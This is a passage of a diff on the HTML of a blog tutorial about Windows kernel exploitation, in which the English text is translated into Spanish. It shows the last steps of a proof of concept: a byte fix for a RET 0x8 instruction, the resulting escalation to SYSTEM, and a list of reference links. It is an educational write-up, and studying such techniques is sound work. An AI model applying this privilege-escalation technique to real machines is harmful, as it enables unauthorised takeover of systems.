 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xc3&#34;</span> // ret
-</span></span></code></pre></div><p>Once we update the PoC and send it, we still get a segfault. So, I decided to look at Ghidra and you can see that the ret operations is <em>RET 0x8</em>. Let&rsquo;s try it!</p>
+</span></span></code></pre></div><p>Una vez que cambiamos el PoC y lo enviamos, todavía chocamos. Así que decidí mirar Ghidra, y puedes ver que la instrucción &ldquo;ret&rdquo; en realidad es <em>RET 0x8</em>. Vamos intentar de nuevo&hellip;</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/lr_7.png" alt="alt text"></p>
-<p>Once sent, we have SYSTEM!</p>
+<p>Una vez que lo enviemos, somos &ldquo;SYSTEM&rdquo;!</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/poc.gif" alt="alt text"></p>
-<h1 id="sources">Sources</h1>
+<h1 id="recursos">Recursos</h1>
 <pre tabindex="0"><code>https://www.welivesecurity.com/2017/03/27/configure-windbg-kernel-debugging/
 https://microsoft.public.windbg.narkive.com/MamhR9YH/win7-and-kpcr
 https://github.com/LordNoteworthy/windows-internals/blob/master/IRP%20Major%20Functions%20List.md
